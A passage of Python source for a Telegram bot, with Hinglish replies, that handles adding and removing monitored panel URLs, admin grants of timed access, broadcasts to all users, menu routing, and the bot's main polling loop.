                    "added_date":   datetime.now().strftime("%Y-%m-%d"),
                }
                existing_urls.add(normalised)
                added += 1

        save_panels(panels)
        msg = f"✅ *{added} panel(s) add ho gaye!*"
        if dupes:
            msg += f"\n⚠️ {dupes} duplicate(s) skip ho gaye"
        if failed:
            msg += f"\n❌ Failed ({len(failed)}):\n" + "\n".join(f"  • {f}" for f in failed)
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    # ── Remove panel flow ─────────────────────────────────────────────────────
    if context.user_data.get("awaiting_remove"):
        context.user_data.pop("awaiting_remove")
        plist = context.user_data.pop("panels_list", [])
        try:
            idx = int(text) - 1
            if 0 <= idx < len(plist):
                panels  = load_panels()
                removed = panels.pop(plist[idx])
                save_panels(panels)
                await update.message.reply_text(
                    f"✅ Panel '{removed.get('name')}' remove ho gaya!"
                )
            else:
                await update.message.reply_text("❌ Galat number!")
        except Exception:
            await update.message.reply_text("❌ Galat input!")
        return

    # ── Give time flow ────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_give_time"):
        context.user_data.pop("awaiting_give_time")
        if uid not in ADMIN_IDS:
            return
        parts = text.strip().split()
        try:
            if len(parts) != 2:
                raise ValueError("Need exactly 2 values")
            target_id = int(parts[0])
            hours     = float(parts[1])
            if hours <= 0 or hours > 720:
                raise ValueError("Hours must be 1–720")

            # Create user record if they don't exist yet
            target_u = get_user(target_id)
            if target_u is None:
                upsert_user(target_id)

            expiry  = grant_access_hours(target_id, hours)
            exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")

            await update.message.reply_text(
                f"✅ *Done!*\n\n"
                f"User `{target_id}` ko *{hours}h* access diya gaya.\n"
                f"Expires at: `{exp_str}`",
                parse_mode="Markdown",
            )
            # Notify the user
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=(
                        f"🎁 *Access Received!*\n\n"
                        f"Admin ne tumhe *{hours} ghante* ka access diya!\n"
                        f"Expires at: `{exp_str}`"
                    ),
                    parse_mode="Markdown",
                )
            except Exception:
                await update.message.reply_text(
                    "⚠️ User ko notify nahi kar paya (unhone bot start nahi kiya hoga)."
                )
        except ValueError as e:
            await update.message.reply_text(
                f"❌ Galat format!\n\n"
                f"Sahi format: `<user_id> <hours>`\n"
                f"Example: `123456789 2`",
                parse_mode="Markdown",
            )
        return

    # ── Broadcast flow ────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_broadcast"):
        context.user_data.pop("awaiting_broadcast")
        if uid not in ADMIN_IDS:
            return
        sent   = 0
        failed = 0
        for target_uid in get_all_user_ids():
            try:
                await context.bot.send_message(
                    chat_id=target_uid, text=text,
                    parse_mode="Markdown", disable_web_page_preview=True,
                )
                sent += 1
            except Exception:
                failed += 1
        await update.message.reply_text(
            f"📨 *Broadcast done!*\n✅ Sent: {sent} | ❌ Failed: {failed}",
            parse_mode="Markdown",
        )
        return

    # ── Menu button routing ───────────────────────────────────────────────────
    if text in ("📊 Status", "Status"):
        await status_command(update, context)
    elif text in ("📋 My Panels", "My Panels"):
        await my_panels_command(update, context)
    elif text in ("➕ Add Panel", "Add Panel"):
        await handle_add_panel(update, context)
    elif text in ("❌ Remove Panel", "Remove Panel"):
        await handle_remove_panel(update, context)
    elif text in ("🔗 My Referral", "My Referral"):
        await my_referral_command(update, context)
    elif text in ("⏳ My Access", "My Access"):
        await my_access_command(update, context)
    elif text in ("👥 Users", "Users"):
        await users_command(update, context)
    elif text in ("📨 Broadcast", "Broadcast"):
        await broadcast_command(update, context)
    elif text in ("⏱ Give Time", "Give Time"):
        await handle_give_time(update, context)

# ── Main ──────────────────────────────────────────────────────────────────────
async def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

    application.job_queue.run_repeating(monitor_panels, interval=MONITOR_INTERVAL, first=5)

    logger.info("Bot starting...")
    async with application:
        await application.initialize()
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        logger.fatal(f"Fatal error: {e}")
